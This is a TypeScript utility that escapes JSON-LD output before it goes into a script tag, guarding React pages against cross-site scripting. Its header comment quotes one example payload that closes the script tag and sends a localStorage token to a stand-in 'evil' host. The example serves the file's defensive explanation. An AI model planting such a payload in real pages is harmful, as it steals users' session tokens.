/**
 * Safe JSON-LD serialisation.
 *
 * `JSON.stringify` escapes quotes but NOT `<`, `>` or `/`. Injecting its output
 * straight into a `<script>` block therefore lets any user-controlled string
 * (a cat name, a bio, a blog excerpt) close the tag and execute:
 *
 *     bio = "</script><img src=x onerror=fetch('//evil/'+localStorage.token)>"
 *
 * Escaping the characters that can terminate a script element — as \uXXXX
 * escapes, which stay valid JSON and parse back to the identical string —
 * closes the hole at the serialisation boundary rather than at each call site.
 * U+2028/U+2029 are escaped too: legal inside JSON strings, but literal line
 * terminators in JS source.
 *
 * Implemented as a char-wise map rather than a regex so this file contains no
 * literal control characters of its own.
 *
 * Always render structured data through this helper. Never hand a raw
 * `JSON.stringify` result to `dangerouslySetInnerHTML`.
 */
const LT = 0x3c;
const GT = 0x3e;
const SLASH = 0x2f;
const LINE_SEP = 0x2028;
const PARA_SEP = 0x2029;

function escapeChar(char: string): string {
  switch (char.charCodeAt(0)) {
    case LT:
      return "\\u003c";
    case GT:
      return "\\u003e";
    case SLASH:
      return "\\u002f";
    case LINE_SEP:
      return "\\u2028";
    case PARA_SEP:
      return "\\u2029";
    default:
      return char;
  }
}

export function serializeJsonLd(data: unknown): string {
  return Array.from(JSON.stringify(data) ?? "", escapeChar).join("");
}

/** Props for a `<script type="application/ld+json">` tag, pre-escaped. */
export function jsonLdProps(data: unknown) {
  return {
    type: "application/ld+json" as const,
    dangerouslySetInnerHTML: { __html: serializeJsonLd(data) },
  };
}
